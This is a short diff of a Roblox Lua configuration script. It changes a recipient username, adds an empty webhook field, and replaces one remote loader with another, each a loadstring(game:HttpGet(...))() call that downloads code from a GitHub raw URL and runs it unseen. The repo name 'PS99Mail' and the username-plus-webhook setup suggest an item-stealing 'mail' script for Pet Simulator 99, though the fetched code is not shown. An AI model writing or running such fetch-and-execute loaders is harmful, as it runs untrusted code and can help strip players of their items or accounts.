@@ -1,5 +1,6 @@
-Username = "JestemCZARNY"
-selectedLoadingScreen = "2"
-LoadingScreen = true
+Username = "PogrzaloCie"
+Webhook = ""
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua"))()
+
+
